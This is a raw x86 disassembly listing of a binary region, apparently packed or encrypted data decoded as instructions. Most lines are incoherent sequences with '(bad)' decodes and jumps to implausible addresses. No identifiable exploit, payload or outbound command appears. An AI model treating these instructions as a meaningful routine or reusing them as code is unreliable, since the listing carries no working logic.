  4165c7:	or     BYTE PTR [eax+0x4000003c],ah
  4165cd:	inc    eax
  4165ce:	cmovno eax,DWORD PTR ds:0x40056243
  4165d5:	int3   
  4165d6:	add    ah,cl
  4165d8:	inc    eax
  4165d9:	inc    eax
  4165da:	bound  eax,QWORD PTR [ecx+0x0]
  4165dd:	add    BYTE PTR [edi],cl
  4165df:	inc    ebx
  4165e0:	inc    eax
  4165e1:	inc    eax
  4165e2:	add    BYTE PTR [ecx+0x43],al
  4165e5:	add    eax,0x40256240
  4165ea:	bound  eax,QWORD PTR [eax]
  4165ec:	or     ch,bl
  4165ee:	sub    BYTE PTR [ecx],ah
  4165f0:	mov    ebx,cs
  4165f2:	push   esp
  4165f3:	inc    edi
  4165f4:	inc    ebx
  4165f5:	jle    0x416621
  4165f7:	inc    ebp
  4165f8:	push   ebx
  4165f9:	dec    eax
  4165fa:	add    BYTE PTR fs:[ecx+0x56],0x38
  4165ff:	mov    eax,ds:0x48524acd
  416604:	inc    edi
  416605:	xlat   BYTE PTR ds:[ebx]
  416606:	sbb    BYTE PTR [edx+eiz*1+0x7e],0x38
  41660b:	pop    edi
  41660c:	and    al,0xd6
  41660e:	es ins DWORD PTR es:[edi],dx
  416610:	mov    ch,0xc0
  416612:	pop    ebx
  416613:	fisttp QWORD PTR [eax+0x40cc0005]
  416619:	inc    ecx
  41661a:	inc    eax
  41661b:	inc    ebx
  41661c:	bound  esp,QWORD PTR ds:0x41400043
  416622:	add    BYTE PTR [eax],al
  416624:	add    eax,0x43624062
  416629:	inc    ecx
  41662a:	inc    eax
  41662b:	inc    eax
  41662c:	inc    eax
  41662d:	add    eax,0x40624340
  416632:	add    eax,0x40664140
  416637:	sbb    eax,0xb1646145
  41663c:	bound  ecx,QWORD PTR [eax+0x47]
  41663f:	jecxz  0x416643
  416641:	arpl   cx,di
  416643:	cld    
  416644:	mov    ch,0xc8
  416646:	test   DWORD PTR [ebp+0x45643f28],edx
  41664c:	arpl   WORD PTR [eax+0x43],di
  41664f:	dec    esi
  416650:	inc    esi
  416651:	push   ecx
  416652:	pop    ecx
  416653:	rcl    BYTE PTR [ecx],1
  416655:	call   0x541a9ea
  41665a:	inc    eax
  41665b:	js     0x41666d
  41665d:	inc    ecx
  41665e:	bound  eax,QWORD PTR [eax+0x40]
  416661:	sldt   WORD PTR [eax-0x34]
  416665:	js     0x4166c9
  416667:	add    eax,0x40664143
  41666c:	inc    ebx
  41666d:	add    BYTE PTR [ecx+0x5],al
  416670:	js     0x4166b2
  416672:	bound  eax,QWORD PTR [eax+0x0]
  416675:	inc    eax
  416676:	mov    DWORD PTR [ecx+0x503a5233],0x737b7d66
  416680:	jecxz  0x416647
  416682:	ss or  edi,0x71824743
  416689:	cmp    ch,bh
  41668b:	ret    
  41668c:	rcl    cl,0x6e
  41668f:	jp     0x41667e
  416691:	jno    0x4166f6
  416693:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416694:	bound  edi,QWORD PTR [edi+0x7b]
  416697:	inc    ecx
  416698:	inc    ebx
  416699:	inc    eax
  41669a:	inc    eax
  41669b:	add    eax,0x434162
  4166a0:	inc    eax
  4166a1:	add    BYTE PTR [edx+0x5],ah
  4166a4:	inc    eax
  4166a5:	adc    BYTE PTR [edx+0x40],ah
  4166a8:	inc    ebx
  4166a9:	inc    ecx
  4166aa:	add    eax,0x4340
  4166af:	add    eax,0x404162
  4166b4:	add    BYTE PTR [eax+0x43],al
  4166b7:	inc    eax
  4166b8:	add    eax,0x456233d7
  4166bd:	inc    edx
  4166be:	adc    eax,0x1b02aaef
  4166c3:	xor    BYTE PTR fs:[ebx-0x60],bl
  4166c7:	mov    ebp,0x64efed32
  4166cc:	mov    edx,0x400a0920
  4166d1:	add    BYTE PTR [eax],al
  4166d3:	inc    ecx
  4166d4:	inc    ebx
  4166d5:	add    eax,0x41784062
  4166da:	inc    eax
  4166db:	inc    eax
  4166dc:	add    BYTE PTR [edi],cl
  4166de:	bound  eax,QWORD PTR [ebx+0x0]
  4166e1:	add    eax,0x25006240
  4166e6:	inc    eax
  4166e7:	add    eax,0x40254143
  4166ec:	add    eax,0x8b620000
  4166f1:	sbb    edx,DWORD PTR cs:[edx-0x63]
  4166f5:	add    ah,BYTE PTR [edx+0x28]
  4166f8:	jb     0x41674f
  4166fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166fb:	pusha  
  4166fc:	push   esi
  4166fd:	retf   
  4166fe:	inc    esi
  4166ff:	inc    edx
  416700:	push   es
  416701:	add    DWORD PTR [esi+0x3c],ebx
  416704:	ret    0x51a4
  416707:	sub    DWORD PTR [eax+0x33556440],ebp
  41670d:	adc    eax,0x805a8c3d
  416712:	add    DWORD PTR [esi],ebx
  416714:	and    BYTE PTR [ecx+0x57],al
  416717:	bound  ebp,QWORD PTR [ecx+0x48e46626]
  41671d:	ffree  st(0)
  41671f:	inc    edi
  416720:	call   0x11a3cb6e
  416725:	sub    al,0xcd
  416727:	test   BYTE PTR [esi-0x348f4300],ah
  41672d:	add    DWORD PTR [ebx+0x0],0x0
  416731:	add    BYTE PTR [ecx+0x40],al
  416734:	bound  esp,QWORD PTR [esi+0x0]
  416737:	inc    eax
  416738:	add    eax,0x5400000
  41673d:	inc    ecx
  41673e:	inc    eax
  41673f:	inc    eax
  416740:	bound  esp,QWORD PTR ds:0x25050043
  416746:	inc    ecx
  416747:	inc    ebx
  416748:	inc    eax
  416749:	test   BYTE PTR [eax+0x0],al
  41674c:	bound  ebx,QWORD PTR [eax+0x62]
  41674f:	inc    ecx
  416750:	inc    eax
  416751:	jbe    0x416796
  416753:	cmp    esi,DWORD PTR [edx]
  416755:	xor    cl,ch
  416757:	dec    eax
  416758:	(bad)  
  416759:	lds    edx,FWORD PTR [eax+0xf171285]
  41675f:	inc    ecx
  416760:	dec    edi
  416761:	sbb    bl,BYTE PTR fs:[esi-0x7f]
  416765:	and    al,0x5e
  416767:	xor    al,0xc9
  416769:	mov    esp,0x36551a43
  41676e:	arpl   WORD PTR [edi+edi*1+0x5f],sp
  416772:	ror    DWORD PTR [ebx+0x41406210],1
  416778:	and    eax,0x40000500
  41677d:	inc    ebx
  41677e:	add    eax,0x40624041
  416783:	inc    ebx
  416784:	add    eax,0x43402541
  416789:	bound  eax,QWORD PTR [eax+0x43]
  41678c:	int3   
  41678d:	inc    eax
  41678e:	bound  eax,QWORD PTR [eax]
  416790:	inc    ecx
  416791:	inc    eax
  416792:	inc    eax
  416793:	add    eax,0x36488705
  416798:	bound  esp,QWORD PTR [ebp+0x35]
  41679b:	jle    0x4167ff
  41679d:	sub    esp,DWORD PTR [edx]
  41679f:	stc    
  4167a0:	add    eax,0x7485344
  4167a5:	jge    0x4167d7
  4167a7:	fs retf 
  4167a9:	inc    esi
  4167aa:	xor    BYTE PTR [edi+0x40628f7f],0x25
  4167b1:	add    BYTE PTR [esi+0x40],ah
  4167b4:	add    eax,0x40404143
  4167b9:	inc    ebx
  4167ba:	add    BYTE PTR [eax],al
  4167bc:	add    BYTE PTR [edx-0x34],ah
  4167bf:	inc    eax
  4167c0:	add    eax,0x40004041
  4167c5:	inc    ecx
  4167c6:	int3   
  4167c7:	add    BYTE PTR [ebx-0x7c],al
  4167ca:	add    eax,0x5406240
  4167cf:	bound  eax,QWORD PTR [ebp+0x66]
  4167d2:	adc    ch,BYTE PTR [ecx]
  4167d4:	or     ecx,ebx
  4167d6:	loop   0x41679a
  4167d8:	gs push edx
  4167da:	mov    al,0xfa
  4167dc:	mov    esp,0x1c81d141
  4167e1:	lds    edx,FWORD PTR ds:0x6a4342c2
  4167e7:	shl    DWORD PTR [ebp+0x7d],cl
  4167ea:	inc    edx
  4167eb:	fdivr  DWORD PTR [eax+esi*1+0x154d01a2]
  4167f2:	ss retf 0xac6b
  4167f6:	push   es
  4167f7:	jno    0x41679c
  4167f9:	gs hlt 
  4167fb:	push   edx
  4167fc:	adc    al,0x47
  4167fe:	cmp    dl,BYTE PTR ds:0x6240bf17
  416804:	pop    eax
  416805:	inc    ecx
  416806:	add    eax,0x40404340
  41680b:	inc    ebx
  41680c:	inc    eax
  41680d:	test   BYTE PTR [eax],al
  41680f:	add    eax,0x40624041
  416814:	inc    eax
  416815:	add    BYTE PTR [edx+0x5],ah
  416818:	inc    ebx
  416819:	add    BYTE PTR [eax+0x78],al
  41681c:	inc    ecx
  41681d:	add    BYTE PTR [eax+0x41],bl
  416820:	bound  esp,QWORD PTR [ebx+ecx*8+0x1c]
  416824:	test   DWORD PTR [ecx+0x43ae0e0a],esp
  41682a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41682b:	arpl   WORD PTR [ebx+0x41],ax
  41682e:	and    DWORD PTR [esi],0x11
  416831:	enter  0x5d8,0x90
  416835:	mov    dl,0x40
  416837:	xor    al,0x62
  416839:	repz mov esi,0x80283735
  41683f:	inc    esp
  416840:	cmp    DWORD PTR [edx+edx*2],ebx
  416843:	adc    eax,0x212d9643
  416848:	mov    WORD PTR ds:0x31d162c9,?
  41684e:	inc    ebx
  41684f:	jp     0x4168b6
  416851:	push   esi
  416852:	test   al,0xf8
  416854:	ret    
  416855:	inc    eax
  416856:	test   BYTE PTR [eax],al
  416858:	int3   
  416859:	bound  eax,QWORD PTR ds:0xcc840f41
  41685f:	inc    ebx
  416860:	add    BYTE PTR [eax+0x0],al
  416863:	inc    eax
  416864:	inc    eax
  416865:	inc    eax
  416866:	int3   
  416867:	add    BYTE PTR ds:0x62404341,al
  41686d:	pop    eax
  41686e:	add    BYTE PTR [ebx+0x40],al
  416871:	bound  ecx,QWORD PTR [edi]
  416873:	inc    eax
  416874:	ja     0x4167f6
  416876:	arpl   WORD PTR [eax+eax*8+0x15],sp
  41687a:	or     al,0xda
  41687c:	imul   edi,DWORD PTR [ebp-0x34479bb7],0x62
  416883:	cmp    DWORD PTR [edi],edi
  416885:	xor    ah,bh
  416887:	push   edx
  416888:	retf   0x8441
  41688b:	inc    ebp
  41688c:	pop    edx
  41688d:	inc    eax
  41688e:	inc    edi
  41688f:	int    0xa8
  416891:	pop    edi
  416892:	ret    
  416893:	inc    ecx
  416894:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416895:	add    BYTE PTR [eax],ah
  416897:	jae    0x4168aa
  416899:	cmp    BYTE PTR [ebx+eax*2-0x6e],ch
  41689d:	es pusha 
  41689f:	add    BYTE PTR [eax],al
  4168a1:	inc    eax
  4168a2:	inc    eax
  4168a3:	cmovno eax,DWORD PTR ds:0x40056243
  4168aa:	int3   
  4168ab:	add    ah,cl
  4168ad:	inc    eax
  4168ae:	inc    eax
  4168af:	bound  eax,QWORD PTR [ecx+0x0]
  4168b2:	add    BYTE PTR [edi],cl
  4168b4:	inc    ebx
  4168b5:	inc    eax
  4168b6:	inc    eax
  4168b7:	add    BYTE PTR [ecx+0x43],al
  4168ba:	add    eax,0x40256240
  4168bf:	bound  eax,QWORD PTR [eax]
  4168c1:	shr    DWORD PTR [ebp+eax*8+0xa00303a],0x56
  4168c9:	push   ebp
  4168ca:	inc    edx
  4168cb:	bound  bp,DWORD PTR [eax+0x642583a6]
  4168d2:	(bad)  
  4168d3:	shr    DWORD PTR [eax-0x2bca4b9],1
  4168d9:	fs push eax
  4168db:	arpl   WORD PTR [edx],dx
  4168dd:	test   DWORD PTR [ebp+0x5521101],esp
  4168e3:	add    ah,cl
  4168e5:	inc    eax
  4168e6:	inc    ecx
  4168e7:	inc    eax
  4168e8:	inc    ebx
  4168e9:	bound  esp,QWORD PTR ds:0x41400043
  4168ef:	add    BYTE PTR [eax],al
  4168f1:	add    eax,0x43624062
  4168f6:	inc    ecx
  4168f7:	inc    eax
  4168f8:	inc    eax
  4168f9:	inc    eax
  4168fa:	add    eax,0x40624340
  4168ff:	add    eax,0x40664140
  416904:	gs pusha 
  416906:	les    eax,FWORD PTR [ebx-0xf]
  416909:	jl     0x41692e
  41690b:	lds    edi,FWORD PTR [edi+0x10]
  41690e:	not    BYTE PTR [eax+0x1b4a8353]
  416914:	fsub   DWORD PTR [edx+0x64]
  416917:	aam    0xe3
  416919:	inc    esi
  41691a:	jecxz  0x4168d9
  41691c:	xchg   ecx,eax
  41691d:	test   eax,0x801d435d
  416922:	fcom   DWORD PTR [esi+0x45]
  416925:	xchg   esp,eax
  416926:	sub    cl,dl
  416928:	xchg   BYTE PTR [ebx],dh
  41692a:	popa   
  41692b:	add    BYTE PTR [ecx+0x4598f30d],cl
  416931:	push   ds
  416932:	push   esp
  416933:	cmp    BYTE PTR [eax-0x18],ah
  416936:	xchg   esi,eax
  416937:	inc    ebx
  416938:	add    BYTE PTR ds:0x41107840,al
  41693e:	bound  eax,QWORD PTR [eax+0x40]
  416941:	sldt   WORD PTR [eax-0x34]
  416945:	js     0x4169a9
  416947:	add    eax,0x40664143
  41694c:	inc    ebx
  41694d:	add    BYTE PTR [ecx+0x5],al
  416950:	js     0x416992
  416952:	bound  eax,QWORD PTR [eax+0x0]
  416955:	inc    eax
  416956:	imul   ecx,DWORD PTR [edx+0x63],0xffffffa1
  41695a:	in     al,0x43
  41695c:	push   ebx
  41695d:	add    BYTE PTR [esi-0x2faffda3],dh
  416963:	lds    esp,FWORD PTR [edx-0x2e]
  416966:	fisubr DWORD PTR [ebp+0x41cb21a9]
  41696c:	inc    ebx
  41696d:	inc    eax
  41696e:	inc    eax
  41696f:	add    eax,0x434162
  416974:	inc    eax
  416975:	add    BYTE PTR [edx+0x5],ah
  416978:	inc    eax
  416979:	adc    BYTE PTR [edx+0x40],ah
  41697c:	inc    ebx
  41697d:	inc    ecx
  41697e:	add    eax,0x4340
  416983:	add    eax,0x404162
  416988:	add    BYTE PTR [eax+0x43],al
  41698b:	inc    eax
  41698c:	add    eax,0x41635f49
  416991:	or     edx,DWORD PTR [esi+0x34]
  416994:	mov    edi,0x43127434
  416999:	pop    ecx
  41699a:	cmp    BYTE PTR [edi],0xbe
  41699d:	inc    eax
  41699e:	pop    edx
  41699f:	sub    al,0x30
  4169a1:	fild   QWORD PTR [ecx]
  4169a3:	or     al,BYTE PTR [eax+0x0]
  4169a6:	add    BYTE PTR [ecx+0x43],al
  4169a9:	add    eax,0x41784062
  4169ae:	inc    eax
  4169af:	inc    eax
  4169b0:	add    BYTE PTR [edi],cl
  4169b2:	bound  eax,QWORD PTR [ebx+0x0]
  4169b5:	add    eax,0x25006240
  4169ba:	inc    eax
  4169bb:	add    eax,0x40254143
  4169c0:	add    eax,0xb1620000
  4169c5:	pop    esp
  4169c6:	test   eax,0x6b86a4a9
  4169cb:	mov    eax,ds:0x62453a6b
  4169d0:	dec    esi
  4169d1:	inc    DWORD PTR [ecx]
  4169d3:	sub    ch,BYTE PTR [eax-0x72ecca3d]
  4169d9:	or     eax,DWORD PTR [ebx+0x0]
  4169dc:	add    BYTE PTR [eax],al
  4169de:	inc    ecx
  4169df:	inc    eax
  4169e0:	bound  esp,QWORD PTR [esi+0x0]
  4169e3:	inc    eax
  4169e4:	add    eax,0x5400000
  4169e9:	inc    ecx
  4169ea:	inc    eax
  4169eb:	inc    eax
  4169ec:	bound  esp,QWORD PTR ds:0x25050043
  4169f2:	inc    ecx
  4169f3:	inc    ebx
  4169f4:	inc    eax
  4169f5:	test   BYTE PTR [eax+0x0],al
  4169f8:	bound  ebx,QWORD PTR [eax+0x62]
  4169fb:	inc    ecx
  4169fc:	inc    eax
  4169fd:	jns    0x4169e0
  4169ff:	adc    DWORD PTR [eax-0x80],ecx
  416a02:	mov    al,ds:0xbf800043
  416a07:	mov    edi,0x9052c515
  416a0c:	shl    DWORD PTR [esp+eiz*2],1
  416a0f:	mov    edi,0xf13748cb
  416a14:	sub    eax,DWORD PTR ds:0x4352bfe3
  416a1a:	mov    al,0x43
  416a1c:	inc    esi
  416a1d:	add    al,0x43
  416a1f:	sub    al,0x10
  416a21:	bound  eax,QWORD PTR [eax+0x41]
  416a24:	and    eax,0x40000500
  416a29:	inc    ebx
  416a2a:	add    eax,0x40624041
  416a2f:	inc    ebx
  416a30:	add    eax,0x43402541
  416a35:	bound  eax,QWORD PTR [eax+0x43]
  416a38:	int3   
  416a39:	inc    eax
  416a3a:	bound  eax,QWORD PTR [eax]
  416a3c:	inc    ecx
  416a3d:	inc    eax
  416a3e:	inc    eax
  416a3f:	add    eax,0x5163405
  416a44:	shl    DWORD PTR [edi+0x40cde1ed],1
  416a4a:	and    BYTE PTR [ebx-0x3f],bh
  416a4d:	mov    ch,BYTE PTR [eax+ebx*2]
  416a50:	int    0x79
  416a52:	std    
  416a53:	mov    esp,0x236aaab3
  416a58:	inc    eax
  416a59:	ret    
  416a5a:	inc    ebp
  416a5b:	add    eax,0x7481e4dc
  416a60:	sub    cl,BYTE PTR [ebx-0x58]
  416a63:	retf   
  416a64:	pop    ecx
  416a65:	loope  0x416ae1
  416a67:	bound  edx,QWORD PTR [eax+0x40623f61]
  416a6d:	and    eax,0x5406600
  416a72:	inc    ebx
  416a73:	inc    ecx
  416a74:	inc    eax
  416a75:	inc    eax
  416a76:	inc    ebx
  416a77:	add    BYTE PTR [eax],al
  416a79:	add    BYTE PTR [edx-0x34],ah
  416a7c:	inc    eax
  416a7d:	add    eax,0x40004041
  416a82:	inc    ecx
  416a83:	int3   
  416a84:	add    BYTE PTR [ebx-0x7c],al
  416a87:	add    eax,0x5406240
  416a8c:	bound  esi,QWORD PTR [eax+0x41]
  416a8f:	inc    esi
  416a90:	add    DWORD PTR [ecx],ebp
  416a92:	mov    edi,0x43451754
  416a97:	stc    
  416a98:	inc    ebx
  416a99:	push   ebx
  416a9a:	inc    eax
  416a9b:	bound  esp,QWORD PTR [edx-0x4]
  416a9e:	xor    BYTE PTR [edi+0x34406180],bl
  416aa4:	mov    sp,0x2fa0
  416aa8:	xor    al,0x7c
  416aaa:	inc    ecx
  416aab:	inc    eax
  416aac:	nop
  416aad:	adc    BYTE PTR [edi-0x28],al
  416ab0:	dec    edi
  416ab1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ab2:	in     al,0x44
  416ab4:	(bad)  
  416ab5:	cld    
  416ab6:	test   DWORD PTR [edi+0x0],esi
  416ab9:	sub    eax,0x645f38c0
  416abe:	inc    ebx
  416abf:	dec    eax
  416ac0:	inc    eax
  416ac1:	bound  ebx,QWORD PTR [eax+0x41]
  416ac4:	add    eax,0x40404340
  416ac9:	inc    ebx
  416aca:	inc    eax
  416acb:	test   BYTE PTR [eax],al
  416acd:	add    eax,0x40624041
  416ad2:	inc    eax
  416ad3:	add    BYTE PTR [edx+0x5],ah
  416ad6:	inc    ebx
  416ad7:	add    BYTE PTR [eax+0x78],al
  416ada:	inc    ecx
  416adb:	add    BYTE PTR [eax+0x41],bl
  416ade:	bound  ebp,QWORD PTR ds:0xd9c3cbb6
  416ae4:	stos   DWORD PTR es:[edi],eax
  416ae5:	nop
  416ae6:	jl     0x416b28
  416ae8:	pop    ecx
  416ae9:	mov    edi,0x8ef93948
  416aee:	sysenter 
  416af0:	sub    edi,DWORD PTR [esi+0x43596305]
  416af6:	rdmsr  
  416af8:	jnp    0x416aab
  416afa:	retf   
  416afb:	push   0x62
  416afd:	rcl    DWORD PTR [ebx+0x4501a108],1
  416b03:	xor    eax,0x81377d74
  416b08:	pop    edx
  416b09:	test   al,0x37
  416b0b:	shr    BYTE PTR [edi+edi*2-0x7bbf9e04],0x0
  416b13:	int3   
  416b14:	bound  eax,QWORD PTR ds:0xcc840f41
  416b1a:	inc    ebx
  416b1b:	add    BYTE PTR [eax+0x0],al
  416b1e:	inc    eax
  416b1f:	inc    eax
  416b20:	inc    eax
  416b21:	int3   
  416b22:	add    BYTE PTR ds:0x62404341,al
  416b28:	pop    eax
  416b29:	add    BYTE PTR [ebx+0x40],al
  416b2c:	bound  ecx,QWORD PTR [edi]
  416b2e:	inc    eax
  416b2f:	loope  0x416b43
  416b31:	js     0x416b73
  416b33:	in     eax,0x20
  416b35:	lock add BYTE PTR [esi-0x18],dh
  416b39:	bound  eax,QWORD PTR [eax-0x48]
  416b3c:	fcomip st,st(5)
  416b3e:	sub    DWORD PTR [edi+0x15],esp
  416b41:	test   eax,0x70416245
  416b46:	ins    DWORD PTR es:[edi],dx
  416b47:	push   eax
  416b48:	int    0xb4
  416b4a:	inc    ebx
  416b4b:	sbb    DWORD PTR [ebx+0x5c],eax
  416b4e:	add    ah,ch
  416b50:	inc    eax
  416b51:	ss stos BYTE PTR es:[edi],al
  416b53:	cwde   
  416b54:	xor    BYTE PTR [edi-0x31d5acd7],cl
  416b5a:	xchg   esp,eax
  416b5b:	pop    ss
  416b5c:	add    BYTE PTR [eax],al
  416b5e:	inc    eax
  416b5f:	inc    eax
  416b60:	cmovno eax,DWORD PTR ds:0x40056243
  416b67:	int3   
  416b68:	add    ah,cl
  416b6a:	inc    eax
  416b6b:	inc    eax
  416b6c:	bound  eax,QWORD PTR [ecx+0x0]
  416b6f:	add    BYTE PTR [edi],cl
  416b71:	inc    ebx
  416b72:	inc    eax
  416b73:	inc    eax
  416b74:	add    BYTE PTR [ecx+0x43],al
  416b77:	add    eax,0x40256240
  416b7c:	bound  eax,QWORD PTR [eax]
  416b7e:	pushf  
  416b7f:	cmp    cl,BYTE PTR [ebx-0x5f]
  416b82:	inc    eax
  416b83:	dec    eax
  416b84:	bound  ecx,QWORD PTR [ecx+eax*8]
  416b87:	mov    WORD PTR [eax],es
  416b89:	and    eax,0x8d344de5
  416b8e:	jae    0x416bc8
  416b90:	push   ss
  416b91:	mov    al,ds:0x62d2a905
  416b96:	push   es
  416b97:	add    eax,0x4140cc00
  416b9c:	inc    eax
  416b9d:	inc    ebx
  416b9e:	bound  esp,QWORD PTR ds:0x41400043
  416ba4:	add    BYTE PTR [eax],al
  416ba6:	add    eax,0x43624062
  416bab:	inc    ecx
  416bac:	inc    eax
  416bad:	inc    eax
  416bae:	inc    eax
  416baf:	add    eax,0x40624340
  416bb4:	add    eax,0x40664140
  416bb9:	inc    edx
  416bba:	sub    ah,BYTE PTR [esi]
  416bbc:	xchg   BYTE PTR [edi+0x21],ah
  416bbf:	jo     0x416c26
  416bc1:	je     0x416bce
  416bc3:	mov    esi,0xc4b85433
  416bc8:	dec    esp
  416bc9:	mov    ebx,DWORD PTR [esi+0x3d7be437]
  416bcf:	pop    ebp
  416bd0:	shld   DWORD PTR [esi+0x63],ebp,cl
  416bd4:	add    eax,0x35a809dd
  416bd9:	cmp    eax,0x41864240
  416bde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416bdf:	and    BYTE PTR [ecx+0x25e2007e],ch
  416be5:	mov    BYTE PTR [edx+0x3a],ah
  416be8:	stos   DWORD PTR es:[edi],eax
  416be9:	jbe    0x416c17
  416beb:	cmp    ah,bl
  416bed:	addr16 jge 0x416bba
  416bf0:	inc    ebx
  416bf1:	les    edx,FWORD PTR [eax+ebx*1+0x5]
  416bf5:	inc    eax
  416bf6:	les    eax,FWORD PTR [ebx+0x0]
  416bf9:	add    eax,0x41107840
  416bfe:	bound  eax,QWORD PTR [eax+0x40]
  416c01:	sldt   WORD PTR [eax-0x34]
  416c05:	js     0x416c69
  416c07:	add    eax,0x40664143
  416c0c:	inc    ebx
  416c0d:	add    BYTE PTR [ecx+0x5],al
  416c10:	js     0x416c52
  416c12:	bound  eax,QWORD PTR [eax+0x0]
  416c15:	inc    eax
  416c16:	and    dl,dl
  416c18:	out    dx,eax
  416c19:	and    BYTE PTR [edx-0x7a],0x40
  416c1d:	dec    edi
  416c1e:	push   0x1317fdf0
  416c23:	xor    al,BYTE PTR [eax-0x40]
  416c26:	lods   al,BYTE PTR ds:[esi]
  416c27:	shr    DWORD PTR [ebx+0x40e2095b],cl
  416c2d:	inc    eax
  416c2e:	bound  edx,QWORD PTR [ebp-0x4d]
  416c31:	mov    BYTE PTR [eax*1-0x4b8abfb8],ah
  416c38:	call   0x5c7a040
  416c3d:	pop    edx
  416c3e:	rol    BYTE PTR [ecx-0x33],1
  416c41:	jmp    0x4365:0xb887351d
  416c48:	cmp    eax,0x40404341
  416c4d:	add    eax,0x434162
  416c52:	inc    eax
  416c53:	add    BYTE PTR [edx+0x5],ah
  416c56:	inc    eax
  416c57:	adc    BYTE PTR [edx+0x40],ah
  416c5a:	inc    ebx
  416c5b:	inc    ecx
  416c5c:	add    eax,0x4340
  416c61:	add    eax,0x404162
  416c66:	add    BYTE PTR [eax+0x43],al
  416c69:	inc    eax
  416c6a:	add    eax,0x44e16344
  416c6f:	cmp    eax,0x433057
  416c74:	xchg   ebp,eax
  416c75:	add    eax,0x9894c141
  416c7a:	ja     0x416ca8
  416c7c:	pop    ebx
  416c7d:	xchg   ah,ch
  416c7f:	inc    edi
  416c80:	cmp    eax,0xa354e147
  416c85:	sub    al,0xe3
  416c87:	les    ebp,FWORD PTR [ebx+0xf016485]
  416c8d:	loopne 0x416c37
  416c8f:	push   esp
  416c90:	inc    eax
  416c91:	inc    ebx
  416c92:	mov    ch,0x67
  416c94:	and    BYTE PTR ds:0x90406311,al
  416c9a:	pop    ecx
  416c9b:	add    DWORD PTR [eax-0x7a],esp
  416c9e:	inc    eax
  416c9f:	add    BYTE PTR [eax],al
  416ca1:	inc    ecx
  416ca2:	inc    ebx
  416ca3:	add    eax,0x41784062
  416ca8:	inc    eax
  416ca9:	inc    eax
  416caa:	add    BYTE PTR [edi],cl
  416cac:	bound  eax,QWORD PTR [ebx+0x0]
  416caf:	add    eax,0x25006240
  416cb4:	inc    eax
  416cb5:	add    eax,0x40254143
  416cba:	add    eax,0x48620000
  416cbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416cc0:	inc    eax
  416cc1:	dec    eax
  416cc2:	add    DWORD PTR [ebp+0x5a],edx
  416cc5:	sub    DWORD PTR ds:0xe743c2c0,ecx
  416ccb:	add    DWORD PTR [ebx-0x569dbd21],ebp
  416cd1:	sar    DWORD PTR [edx],1
  416cd3:	inc    esp
  416cd4:	inc    esi
  416cd5:	add    eax,0x4244c641
  416cda:	fiadd  WORD PTR [ecx+0x3c9886e3]
  416ce0:	bound  esi,QWORD PTR [ecx]
  416ce2:	mov    al,0x68
  416ce4:	or     BYTE PTR [ecx],ah
  416ce6:	out    dx,eax
  416ce7:	xor    BYTE PTR [eax+0x2b80b092],bh
  416ced:	inc    ebx
  416cee:	add    BYTE PTR [eax],al
  416cf0:	add    BYTE PTR [ecx+0x40],al
  416cf3:	bound  esp,QWORD PTR [esi+0x0]
  416cf6:	inc    eax
  416cf7:	add    eax,0x5400000
  416cfc:	inc    ecx
  416cfd:	inc    eax
  416cfe:	inc    eax
  416cff:	bound  esp,QWORD PTR ds:0x25050043
  416d05:	inc    ecx
  416d06:	inc    ebx
  416d07:	inc    eax
  416d08:	test   BYTE PTR [eax+0x0],al
  416d0b:	bound  ebx,QWORD PTR [eax+0x62]
  416d0e:	inc    ecx
  416d0f:	inc    eax
  416d10:	fisubr WORD PTR [eax+0x574164f2]
  416d16:	and    al,0x11
  416d18:	add    eax,0x41c6a810
  416d1d:	stos   DWORD PTR es:[edi],eax
  416d1e:	(bad)  
  416d1f:	jecxz  0x416ca7
  416d21:	push   eax
  416d22:	adc    BYTE PTR [eax+0x2d48aa43],ch
  416d28:	add    bl,BYTE PTR es:[eax-0x7e72cfa2]
  416d2f:	popa   
  416d30:	(bad)  
  416d32:	add    eax,0x36fe9426
  416d37:	lahf   
  416d38:	add    eax,0x4753cb48
  416d3d:	jge    0x416d41
  416d3f:	jo     0x416cc7
  416d41:	adc    eax,0xb4853512
  416d46:	and    DWORD PTR [ecx],esp
  416d48:	sub    al,0x45
  416d4a:	mov    al,ds:0x10fe4340
  416d4f:	bound  eax,QWORD PTR [eax+0x41]
  416d52:	and    eax,0x40000500
  416d57:	inc    ebx
  416d58:	add    eax,0x40624041
  416d5d:	inc    ebx
  416d5e:	add    eax,0x43402541
  416d63:	bound  eax,QWORD PTR [eax+0x43]
  416d66:	int3   
  416d67:	inc    eax
  416d68:	bound  eax,QWORD PTR [eax]
  416d6a:	inc    ecx
  416d6b:	inc    eax
  416d6c:	inc    eax
  416d6d:	add    eax,0xdc396005
  416d72:	inc    ecx
  416d73:	inc    esi
  416d74:	dec    eax
  416d75:	nop
  416d76:	push   esi
  416d77:	pop    ecx
  416d78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416d79:	add    eax,0x653dbe98
  416d7e:	shl    BYTE PTR [edi+0x28],0x86
  416d82:	(bad)  
  416d83:	sub    al,0x42
  416d85:	inc    ebx
  416d86:	in     eax,0xc2
  416d88:	pop    eax
  416d89:	sub    al,0x62
  416d8b:	inc    eax
  416d8c:	and    eax,0x5406600
  416d91:	inc    ebx
  416d92:	inc    ecx
  416d93:	inc    eax
  416d94:	inc    eax
  416d95:	inc    ebx
  416d96:	add    BYTE PTR [eax],al
  416d98:	add    BYTE PTR [edx-0x34],ah
  416d9b:	inc    eax
  416d9c:	add    eax,0x40004041
  416da1:	inc    ecx
  416da2:	int3   
  416da3:	add    BYTE PTR [ebx-0x7c],al
  416da6:	add    eax,0x5406240
  416dab:	bound  ebp,QWORD PTR [eax+0x1dd17d9e]
  416db1:	mov    al,ds:0x3c11dba3
  416db6:	cmp    BYTE PTR [ebp+0x561485a],dl
  416dbc:	inc    esp
  416dbd:	(bad)  
  416dbe:	fldcw  WORD PTR [ebp-0xd]
  416dc1:	rol    BYTE PTR [ebx],0x86
  416dc4:	or     BYTE PTR [eax],dl
  416dc6:	test   eax,0x5a859b07
  416dcb:	and    ebx,ecx
  416dcd:	xchg   esp,eax
  416dce:	mov    ah,0xa
  416dd0:	adc    eax,0x48da8578
  416dd5:	inc    eax
  416dd6:	bound  ebx,QWORD PTR [eax+0x41]
